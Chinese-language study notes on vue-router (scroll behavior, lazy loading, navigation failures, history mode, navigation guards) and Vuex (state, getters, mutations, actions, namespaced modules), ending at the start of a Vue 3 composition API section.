使用前端路由，当切换到新路由时，想要页面滚到顶部，或者是保持原先的滚动位置，就像重新加载页面那样。 `vue-router` 能做到，而且更好，它让你可以自定义路由切换时页面如何滚动。

**注意: 这个功能只在支持 `history.pushState` 的浏览器中可用。**

当创建一个 Router 实例，你可以提供一个 `scrollBehavior` 方法：

```js
const router = new VueRouter({
  routes: [...],
  scrollBehavior (to, from, savedPosition) {
    // return 期望滚动到哪个的位置
  }
})
```

`scrollBehavior` 方法接收 `to` 和 `from` 路由对象。第三个参数 `savedPosition` 当且仅当 `popstate` 导航 (通过浏览器的 前进/后退 按钮触发) 时才可用。

这个方法返回滚动位置的对象信息，长这样：

- `{ x: number, y: number }`
- `{ selector: string, offset? : { x: number, y: number }}` (offset 只在 2.6.0+ 支持)

如果返回一个 falsy (译者注：falsy 不是 `false`，或者是一个空对象，那么不会发生滚动。

#### 路由懒加载



当打包构建应用时，JavaScript 包会变得非常大，影响页面加载。如果我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应组件，这样就更加高效了。

结合 Vue 的异步组件和 Webpack 的代码分割功能，轻松实现路由组件的懒加载。

首先，可以将异步组件定义为返回一个 Promise 的工厂函数 (该函数返回的 Promise 应该 resolve 组件本身)：

```js
const Foo = () =>
  Promise.resolve({
    /* 组件定义对象 */
  })
```

第二，在 Webpack 2 中，我们可以使用动态 import 语法来定义代码分块点 (split point)：

```js
import('./Foo.vue') // 返回 Promise
```

注意

如果您使用的是 Babel，你将需要添加 `syntax-dynamic-import`插件，才能使 Babel 可以正确地解析语法。

结合这两者，这就是如何定义一个能够被 Webpack 自动代码分割的异步组件。

```js
const Foo = () => import('./Foo.vue')
```

在路由配置中什么都不需要改变，只需要像往常一样使用 `Foo`：

```js
const router = new VueRouter({
  routes: [{ path: '/foo', component: Foo }]
})
```

###### 把组件按组分块

有时候我们想把某个路由下的所有组件都打包在同个异步块 (chunk) 中。只需要使用 命名 chunk (opens new window)，一个特殊的注释语法来提供 chunk name (需要 Webpack > 2.4)。

```js
const Foo = () => import(/* webpackChunkName: "group-foo" */ './Foo.vue')
const Bar = () => import(/* webpackChunkName: "group-foo" */ './Bar.vue')
const Baz = () => import(/* webpackChunkName: "group-foo" */ './Baz.vue')
```

Webpack 会将任何一个异步模块与相同的块名称组合到相同的异步块中。



#### 导航故障

> 3.4.0中新增

*导航故障*，或者叫*导航失败*，表示一次失败的导航，原文叫 navigation failures，本文统一采用*导航故障*。

##### 检测导航故障

*导航故障*是一个 `Error` 实例，附带了一些额外的属性。要检查一个错误是否来自于路由器，可以使用 `isNavigationFailure` 函数：

```js
import VueRouter from 'vue-router'
const { isNavigationFailure, NavigationFailureType } = VueRouter

// 正在尝试访问 admin 页面
router.push('/admin').catch(failure => {
  if (isNavigationFailure(failure, NavigationFailureType.redirected)) {
    // 向用户显示一个小通知
    showToast('Login in order to access the admin panel')
  }
})
```

提示

如果你忽略第二个参数：`isNavigationFailure(failure)`，那么就只会检查这个错误是不是一个*导航故障*。

##### NavigationFailureType

`NavigationFailureType` 可以帮助开发者来区分不同类型的*导航故障*。有四种不同的类型：

- `redirected`：在导航守卫中调用了 `next(newLocation)` 重定向到了其他地方。
- `aborted`：在导航守卫中调用了 `next(false)` 中断了本次导航。
- `cancelled`：在当前导航还没有完成之前又有了一个新的导航。比如，在等待导航守卫的过程中又调用了 `router.push`。
- `duplicated`：导航被阻止，因为我们已经在目标位置了。

##### 导航故障的属性

所有的导航故障都会有 `to` 和 `from` 属性，分别用来表达这次失败的导航的目标位置和当前位置。

```js
// 正在尝试访问 admin 页面
router.push('/admin').catch(failure => {
  if (isNavigationFailure(failure, NavigationFailureType.redirected)) {
    failure.to.path // '/admin'
    failure.from.path // '/'
  }
})
```

在所有情况下，`to` 和 `from` 都是规范化的路由位置。

#### 路由模式

##### HTML5 History 模式

`vue-router` 默认 hash 模式 —— 使用 URL 的 hash 来模拟一个完整的 URL，于是当 URL 改变时，页面不会重新加载。

如果不想要很丑的 hash，我们可以用路由的 **history 模式**，这种模式充分利用 `history.pushState` API 来完成 URL 跳转而无须重新加载页面。

```js
const router = new VueRouter({
  mode: 'history',
  routes: [...]
})
```

当你使用 history 模式时，URL 就像正常的 url，例如 `http://yoursite.com/user/id`，也好看！

不过这种模式要玩好，还需要后台配置支持。因为我们的应用是个单页客户端应用，如果后台没有正确的配置，当用户在浏览器直接访问 `http://oursite.com/user/id` 就会返回 404，这就不好看了。

所以呢，要在服务端增加一个覆盖所有情况的候选资源：如果 URL 匹配不到任何静态资源，则应该返回同一个 `index.html` 页面，这个页面就是app 依赖的页面

##### 警告

给个警告，因为这么做以后，服务器就不再返回 404 错误页面，因为对于所有路径都会返回 `index.html` 文件。为了避免这种情况，应该在 Vue 应用里面覆盖所有的路由情况，然后再给出一个 404 页面。

```js
const router = new VueRouter({
  mode: 'history',
  routes: [
    { 
        path: '*', component: NotFoundComponent }
  ]
})
```

或者，如果使用 Node.js 服务器，可以用服务端路由匹配到来的 URL，并在没有匹配到路由的时候返回 404，以实现回退。更多详情请查阅

#### $route 

表示当前激活的路由的状态信息

```
1.'$route'一个路由对象 (route object) 表示当前激活的路由的状态信息，包含了当前 URL 解析得到的信息，
还有 URL 匹配到的路由记录,简单的说包含'当前路由规则，路径,参数'
2.如图此时的'$route'包含当前所在路由的信息
  2.1.利用'$route.query'属性获取连接上的参数，url参数使用?形式
  2.2.利用'$route.params' 获取参数，url形式是/参数的形式
```

##### 推荐

使用props实现动态路由参数页面获取，将组件与路由解耦

#### vue中新窗口打开vue界面

```js
let {herf}=this.$router.resolve({
    ....路由
})
window.open(href, '_blank');
```

#### 导航守卫

导航表示路由正在发生改变。

vuerouter 一套**钩子**来触发路由在不同阶段触发的函数

```
1.vuerouter 一套钩子来触发路由在不同阶段触发的函数
2.导航守卫分成三大块'全局守卫'，'路由独享守卫'，'组件内守卫'
3.'全局守卫' 顾名思义所有路由在进入跳转的时候都会触发，整个'全局路
由'分为三个阶段依次是'beforeEach'、'beforeResolve'、'afterEach'
4.'路由独享守卫' 顾名思义只在定义路由和路由组件中的对象中使用它有一
个阶段'beforeEnter'
5.'组件内守卫'顾名思义只在组件中触发的路由内容它有三个阶段依次
是'beforeRouteEnter'、'beforeRouteUpdate'、'beforeRouteLeave'
```

##### 导航守卫中next()参数讲解

```
    next: Function: 一定要调用该方法来 resolve 这个钩子。执行效果依赖 next 方法的调用参数。
    
    next(): 进行管道中的下一个钩子。如果全部钩子执行完了，则导航的状态就是 confirmed (确认的)。
    
    next(false): 中断当前的导航。如果浏览器的 URL 改变了 (可能是用户手动或者浏览器后退按钮)，那么 URL 地址会重置到 from 路由对应的地址。
    
    next('/') 或者 next({ path: '/' }): 跳转到一个不同的地址。当前的导航被中断，然后进行一个新的导航。你可以向 next 传递任意位置对象，且允许设置诸如 replace: true、name: 'home' 之类的选项以及任何用在 router-link 的 to prop 或 router.push 中的选项。
    
    next(error): (2.4.0+) 如果传入 next 的参数是一个 Error 实例，则导航会被终止且该错误会被传递给 router.onError() 注册过的回调。
```

##### 全局守卫

**beforeEach 全局前置守卫**

应用场景：判断用户是否登录

```
常用来判断用户是否登录，官方给的中文名字叫'全局前置守卫'在路由刚开始触发且还未进入，路由对应的组件中，简单的理解最早触发，但是触发时候没有任何组件一类的加载，正因为如此适合做登陆判断逻辑。
```

**beforeResolve 全局解析守卫 **

```
在导航被确认之前，同时在路由独享守卫和所有组件内守卫和异步路由组件被解析之后，解析守卫就被调用
```

**afterEach 全局后置钩子**

应用场景：控制加载中、蒙版消失

```
在所有路由的生命周期结束后调用，简单的说就是整个路由周期都完事了,这个阶段可以做一场景,当我们在加载后台数据的时候经常会做一个蒙版。
这个蒙版上会有一个加载的转圈的团,'afterEach'是整个路由结束阶段,因此也可以理解成是整个组件加载完阶段,所以在这个时候控制蒙版消失最好。
```

注意是'afterEach ' 整个生命周期都已经结束了，所以**不需要**在**使用next()**往下继续传递执行了。



##### 路由独享守卫

```
路由独享守卫中只有'路由独享守卫' -- 'beforeEnter' 阶段，是当前组件路由进入的时候触发的阶段。
```

1.下面案例触发顺序展示的是全局守卫和路由守卫整体的生命周期:    

beforeEach 生命周期    

beforeEnter 路由守卫中的生命周期

beforeResolve 生命周期    

afterEach 生命周期



##### 组件内守卫

```
1.组件内守卫分三个阶段:'beforeRouteEnter'、'beforeRouteUpdate'、'beforeRouteLeave'三个阶段会在不同时刻触发
	// 在渲染该组件的对应路由被 confirm 前调用
	// 不！能！获取组件实例 `this`
    // 因为当守卫执行前，组件实例还没被创建
2.'beforeRouteEnter' 在还没有进入该组件之前触发，一般用获取异步请求，可以替代vue生命周期中获取数据请求
3.'beforeRouteUpdate'在动态路由中使用，由于动态路由中切换路由的时候 ，由于绑定的是同一个组件因此在不会在重新渲染，但是为了可以让组件中的内容重新渲染，有两种方法第一种使用watch 监听，但这种需要使用'props'写法，另一种就是在'beforeRouteUpdate' 它会

监听到动态路由的改变，

因此可以在这个周期中异步动态路由对应的数据
4.'beforeRouteLeave' 离开组件的时候触发，可以对表单一些校验未提交的时候触发询问用户是否到下一个页面。官方的说法这个离开守卫通常用来禁止用户在还未保存修改前突然离开。该导航可以通过 next(false) 来取消。
```

应用场景：

'beforeRouteEnter' ：利用beforeRouteEnter特性给组件获取异步值

```
1.可以通过传一个回调给 next来访问组件实例。在导航被确认的时候执行回调，并且把组件实例作为回调方法的参数。
2.注意 beforeRouteEnter 是支持给 next 传递回调的唯一守卫。对于 beforeRouteUpdate 和 beforeRouteLeave 来说，this 已经可用了，所以不支持传递回调，因为没有必要了。

beforeRouteEnter (to, from, next) {
  next(vm => {
    // 通过 `vm` 访问组件实例
  })
}
```

'beforeRouteUpdate'：动态路由切换，监听动态路由的改变

'beforeRouteLeave'：用户还未保存修改前突然离开



#### 官方的守卫导航周期总结

```
1.导航被触发。
2.在失活的组件里调用离开守卫。
3.调用全局的 beforeEach 守卫。
4.在重用的组件里调用 beforeRouteUpdate 守卫 (2.2+)。
5.在路由配置里调用 beforeEnter。
6.解析异步路由组件。
7.在被激活的组件里调用 beforeRouteEnter。
8.调用全局的 beforeResolve 守卫 (2.5+)。
9.导航被确认。
10.调用全局的 afterEach 钩子。
11.触发 DOM 更新。
12.用创建好的实例调用 beforeRouteEnter 守卫中传给 next 的回调函数。
```



## VueX

Vuex 是一个专为 Vue.js 应用程序开发的**状态管理模式**。它采用**集中式存储**管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化

每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的**状态 (state)**。Vuex 和单纯的全局对象有以下两点不同：

1. Vuex 的状态存储是响应式的。
2. 不能直接改变 store 中的状态。改变 store 中的状态的**唯一**途径就是显式地**提交 (commit) mutation**。

- store 中的状态是响应式的
- 在组件中调用 store 中的状态简单到仅需要在计算属性中返回即可
- 触发变化也仅仅是在组件的 methods 中提交 mutation

**vuex中，有默认的五种基本的对象**

- state：存储状态（变量）
- getters：对数据获取之前的再次编译，可以理解为state的计算属性，在组件中使用 $sotre.getters.fun()
- mutations：修改状态，并且是同步的。在组件中使用$store.commit('',params)
- actions：异步操作。在组件中使用是$store.dispath('')
- modules：store的子模块，为了开发大型项目，方便状态管理而使用的。这里我们就不解释了，用起来和上面的一样。

### State

单一状态树，与模块化不冲突

##### `mapState` 辅助函数

当一个组件需要获取多个状态的时候，将这些状态都声明为计算属性会有些重复和冗余。为了解决这个问题，我们可以使用 `mapState` 辅助函数帮助我们生成计算属性，让你少按几次键：

```js
// 在单独构建的版本中辅助函数为 Vuex.mapState
import { mapState } from 'vuex'

export default {
  // ...
  computed: mapState({
    // 箭头函数可使代码更简练
    count: state => state.count,

    // 传字符串参数 'count' 等同于 `state => state.count`
    countAlias: 'count',

    // 为了能够使用 `this` 获取局部状态，必须使用常规函数
    countPlusLocalState (state) {
      return state.count + this.localCount
    }
  })
}
```

当映射的计算属性的名称与 state 的子节点名称相同时，也可以给 `mapState` 传一个字符串数组。

```js
computed: mapState([
  // 映射 this.count 为 store.state.count
  'count'
])
```

##### 对象展开运算符

`mapState` 函数返回的是一个对象。如何将它与局部计算属性混合使用呢？通常，需要使用一个工具函数将多个对象合并为一个，以使可以将最终对象传给 `computed` 属性。但自从有了[对象展开运算符 (opens new window)](https://github.com/tc39/proposal-object-rest-spread)，我们可以极大地简化写法：

```js
computed: {
  localComputed () { /* ... */ },
  // 使用对象展开运算符将此对象混入到外部对象中
  ...mapState({
    // ...
  })
}
```



### Getter

从 store 中的 state 中派生出一些状态，例如对列表进行过滤并计数

Vuex 允许在 store 中定义“getter”（可以认为是 store 的计算属性）

就像计算属性一样，getter 的返回值会**根据它的依赖被缓存起来**，且只有**当它的依赖值发生了改变**才会被重新计算。

Getter 接受 state 作为其第一个参数

##### 通过属性访问

Getter 会暴露为 `store.getters` 对象，你可以以属性的形式访问这些值：

```js
store.getters.doneTodos // -> [{ id: 1, text: '...', done: true }]
```



Getter 也可以接受其他 getter 作为第二个参数：

```js
getters: {
  // ...
  doneTodosCount: (state, getters) => {
    return getters.doneTodos.length
  }
}
store.getters.doneTodosCount // -> 1
```



可以很容易地在任何组件中使用它：

```js
computed: {
  doneTodosCount () {
    return this.$store.getters.doneTodosCount
  }
}
```

注意，getter 在通过属性访问时是作为 Vue 的响应式系统的一部分缓存其中的。



##### 通过方法访问

也可以通过让 getter 返回一个函数，来实现给 getter 传参。对 store 里的数组进行查询时非常有用。

```js
getters: {
  // ...
  getTodoById: (state) => (id) => {
    return state.todos.find(todo => todo.id === id)
  }
}
store.getters.getTodoById(2) // -> { id: 2, text: '...', done: false }
```

注意，getter 在通过方法访问时，每次都会去进行调用，而不会缓存结果。



##### `mapGetters` 辅助函数

`mapGetters` 辅助函数仅仅是将 store 中的 getter 映射到局部计算属性：

```js
import { mapGetters } from 'vuex'

export default {
  // ...
  computed: {
  // 使用对象展开运算符将 getter 混入 computed 对象中
    ...mapGetters([
      'doneTodosCount',
      'anotherGetter',
      // ...
    ])
  }
}
```



如果你想将一个 getter 属性另取一个名字，使用对象形式：

```js
...mapGetters({
  // 把 `this.doneCount` 映射为 `this.$store.getters.doneTodosCount`
  doneCount: 'doneTodosCount'
})
```



### Mutation 同步

必须是同步函数

##### 在组件中提交 Mutation

可以在组件中使用 `this.$store.commit('xxx')` 提交 mutation

或者使用 `mapMutations` 辅助函数将组件中的 methods 映射为 `store.commit` 调用（需要在根节点注入 `store`）。



### Action 异步

Action 类似于 mutation，不同在于：

- Action 提交的是 mutation，而不是直接变更状态。
- Action 可以包含任意异步操作

Action 函数接受一个与 store 实例具有相同方法和属性的 context 对象，因此可以调用 `context.commit` 提交一个 mutation

或者通过 `context.state` 和 `context.getters` 来获取 state 和 getters。



##### 分发 Action

Action 通过 `store.dispatch` 方法触发：

```js
store.dispatch('increment')
```

**mutation 必须同步执行**，action 内部可以执行**异步**操作：

```js
actions: {
  incrementAsync ({ commit }) {
    setTimeout(() => {
      commit('increment')
    }, 1000)
  }
}
```

Actions 支持同样的载荷方式和对象方式进行分发：

```js
// 以载荷形式分发
store.dispatch('incrementAsync', {
  amount: 10
})

// 以对象形式分发
store.dispatch({
  type: 'incrementAsync',
  amount: 10
})
```



### Module

由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。

为了解决以上问题，Vuex 允许将 store 分割成**模块（module）**。

每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割：

```js
const moduleA = {
  state: () => ({ ... }),
  mutations: { ... },
  actions: { ... },
  getters: { ... }
}

const moduleB = {
  state: () => ({ ... }),
  mutations: { ... },
  actions: { ... }
}

const store = new Vuex.Store({
  modules: {
    a: moduleA,
    b: moduleB
  }
})

store.state.a // -> moduleA 的状态
store.state.b // -> moduleB 的状态
```

##### 模块的局部状态

对于模块内部的 mutation 和 getter，接收的第一个参数是**模块的局部状态对象**。

```js
const moduleA = {
  state: () => ({
    count: 0
  }),
  mutations: {
    increment (state) {
      // 这里的 `state` 对象是模块的局部状态
      state.count++
    }
  },

  getters: {
    doubleCount (state) {
      return state.count * 2
    }
  }
}
```

同样，对于模块内部的 action，局部状态通过 `context.state` 暴露出来，根节点状态则为 `context.rootState`：

```js
const moduleA = {
  // ...
  actions: {
    incrementIfOddOnRootSum ({ state, commit, rootState }) {
      if ((state.count + rootState.count) % 2 === 1) {
        commit('increment')
      }
    }
  }
}
```

对于模块内部的 getter，根节点状态会作为第三个参数暴露出来：

```js
const moduleA = {
  // ...
  getters: {
    sumWithRootCount (state, getters, rootState) {
      return state.count + rootState.count
    }
  }
}
```

##### 命名空间

默认情况下，模块内部的 action、mutation 和 getter 注册在**全局命名空间**的——这样使得多个模块能够对同一mutation 或 action 作出响应。

如果希望模块具有更高的封装度和复用性，可以通过添加 `namespaced: true` 的方式使其成为带命名空间的模块。

当模块被注册后，它的所有 getter、action 及 mutation 都会自动根据模块注册的路径调整命名。例如：

```js
const store = new Vuex.Store({
  modules: {
    account: {
      namespaced: true,

      // 模块内容（module assets）
      state: () => ({ ... }), // 模块内的状态已经是嵌套的了，使用 `namespaced` 属性不会对其产生影响
      getters: {
        isAdmin () { ... } // -> getters['account/isAdmin']
      },
      actions: {
        login () { ... } // -> dispatch('account/login')
      },
      mutations: {
        login () { ... } // -> commit('account/login')
      },

      // 嵌套模块
      modules: {
        // 继承父模块的命名空间
        myPage: {
          state: () => ({ ... }),
          getters: {
            profile () { ... } // -> getters['account/profile']
          }
        },

        // 进一步嵌套命名空间
        posts: {
          namespaced: true,

          state: () => ({ ... }),
          getters: {
            popular () { ... } // -> getters['account/posts/popular']
          }
        }
      }
    }
  }
})
```

启用了命名空间的 getter 和 action 会收到局部化的 `getter`，`dispatch` 和 `commit`。换言之，你在使用模块内容（module assets）时不需要在同一模块内额外添加空间名前缀。更改 `namespaced` 属性后不需要修改模块内的代码。



##### 在带命名空间的模块内访问全局内容（Global Assets）

如果希望使用全局 state 和 getter，`rootState` 和 `rootGetters` 会作为第三和第四参数传入 getter，也会通过 `context` 对象的属性传入 action。

若需要在全局命名空间内分发 action 或提交 mutation，将 `{ root: true }` 作为第三参数传给 `dispatch` 或 `commit` 即可。

```js
modules: {
  foo: {
    namespaced: true,

    getters: {
      // 在这个模块的 getter 中，`getters` 被局部化了
      // 你可以使用 getter 的第四个参数来调用 `rootGetters`
      someGetter (state, getters, rootState, rootGetters) {
        getters.someOtherGetter // -> 'foo/someOtherGetter'
        rootGetters.someOtherGetter // -> 'someOtherGetter'
      },
      someOtherGetter: state => { ... }
    },

    actions: {
      // 在这个模块中， dispatch 和 commit 也被局部化了
      // 他们可以接受 `root` 属性以访问根 dispatch 或 commit
      someAction ({ dispatch, commit, getters, rootGetters }) {
        getters.someGetter // -> 'foo/someGetter'
        rootGetters.someGetter // -> 'someGetter'

        dispatch('someOtherAction') // -> 'foo/someOtherAction'
        dispatch('someOtherAction', null, { root: true }) // -> 'someOtherAction'

        commit('someMutation') // -> 'foo/someMutation'
        commit('someMutation', null, { root: true }) // -> 'someMutation'
      },
      someOtherAction (ctx, payload) { ... }
    }
  }
}
```



##### 在带命名空间的模块注册全局 action

若需要在带命名空间的模块注册全局 action，你可添加 `root: true`，并将这个 action 的定义放在函数 `handler` 中。例如：

```js
{
  actions: {
    someOtherAction ({dispatch}) {
      dispatch('someAction')
    }
  },
  modules: {
    foo: {
      namespaced: true,

      actions: {
        someAction: {
          root: true,
          handler (namespacedContext, payload) { ... } // -> 'someAction'
        }
      }
    }
  }
}
```



##### 带命名空间的绑定函数

当使用 `mapState`, `mapGetters`, `mapActions` 和 `mapMutations` 这些函数来绑定带命名空间的模块时，写起来可能比较繁琐：

```js
computed: {
  ...mapState({
    a: state => state.some.nested.module.a,
    b: state => state.some.nested.module.b
  })
},
methods: {
  ...mapActions([
    'some/nested/module/foo', // -> this['some/nested/module/foo']()
    'some/nested/module/bar' // -> this['some/nested/module/bar']()
  ])
}
```

对于这种情况，可以将模块的空间名称字符串作为第一个参数传递给上述函数，这样所有绑定都会自动将该模块作为上下文。于是上面的例子可以简化为：

```js
computed: {
  ...mapState('some/nested/module', {
    a: state => state.a,
    b: state => state.b
  })
},
methods: {
  ...mapActions('some/nested/module', [
    'foo', // -> this.foo()
    'bar' // -> this.bar()
  ])
}
```



而且，可以通过使用 `createNamespacedHelpers` 创建基于某个命名空间辅助函数。

它返回一个对象，对象里有新的绑定在给定命名空间值上的组件绑定辅助函数：

```js
import { createNamespacedHelpers } from 'vuex'

const { mapState, mapActions } = createNamespacedHelpers('some/nested/module')

export default {
  computed: {
    // 在 `some/nested/module` 中查找
    ...mapState({
      a: state => state.a,
      b: state => state.b
    })
  },
  methods: {
    // 在 `some/nested/module` 中查找
    ...mapActions([
      'foo',
      'bar'
    ])
  }
}
```



## Vue 3.x

### 组合式api

问题场景：

Vue 其中一个被人诟病得很严重的问题就是逻辑复用。随着项目越发的复杂，可以抽象出来被复用的逻辑也越发的多。但是 Vue 在 2.x 阶段只能通过 mixins 来解决（当然也可以非常绕地实现 HOC，这里不再展开）。mixins 只是简单地把代码逻辑进行合并，如果需要对逻辑进行追踪将会是一个非常痛苦的过程，因为繁杂的业务逻辑里面往往很难一眼看出哪些数据或方法是来自 mixins 的，哪些又是来自当前组件的。



#### ref

在对象中包装值似乎不必要，但在 JavaScript 中保持不同数据类型的行为统一是必需的。这是因为在 JavaScript 中，`Number` 或 `String` 等基本类型是通过**值传递**的，而不是通过引用传递的

`ref` 对值创建了一个**响应式引用**